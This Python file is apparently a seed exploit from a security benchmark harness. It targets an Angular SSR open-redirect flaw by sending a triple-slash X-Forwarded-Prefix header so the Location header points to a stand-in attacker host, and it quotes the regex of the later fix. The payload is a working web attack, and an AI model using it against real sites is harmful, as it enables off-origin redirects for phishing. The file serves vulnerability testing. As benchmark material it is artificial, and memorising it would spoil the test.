#!/usr/bin/env python3
r"""[GIVEN] CVE-2026-27738 seed exploit — triple-slash X-Forwarded-Prefix open redirect.

Angular SSR builds a redirect's Location as joinUrlParts(X-Forwarded-Prefix, target).
Before the CVE-2026-27738 fix, joinUrlParts stripped only ONE leading slash, so a
prefix of `///<host>` collapsed to `//<host>` — a protocol-relative URL the browser
follows off-origin.

The per-run flag is used as the attacker's redirect-host label so a successful steer
makes the flag token appear in the Location header (see oracle.py / flag_spec.json).

Contract:
  * V0 (@angular/ssr 20.3.16): Location `//<flag>.evil.invalid/new` -> flag reached.
  * V1 (@angular/ssr 20.3.17): BLOCKED. The 27738 fix adds
        INVALID_PREFIX_REGEX = /^[/\\]{2}|(?:^|[/\\])\.\.?(?:[/\\]|$)/
    which rejects any prefix starting with two slash/backslash chars -> HTTP 400,
    no Location, flag absent. This is the seed the system-under-test is given.
"""
from __future__ import annotations

# The redirect route the app exposes (analogous to the pilot's aliased /pub/).
REDIRECT_ROUTE = "/old"


def candidate(flag: str) -> dict:
    """Request candidate: GET /old with a triple-slash X-Forwarded-Prefix whose host
    label is the per-run flag. `flag` is injected by the oracle at run time."""
    prefix = f"///{flag}.evil.invalid"
    return {
        "probe_id": "cve-2026-27738-triple-slash",
        "method": "GET",
        "path": REDIRECT_ROUTE,
        "headers": {"X-Forwarded-Prefix": prefix},
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("PCBFLAG_example"), indent=2))
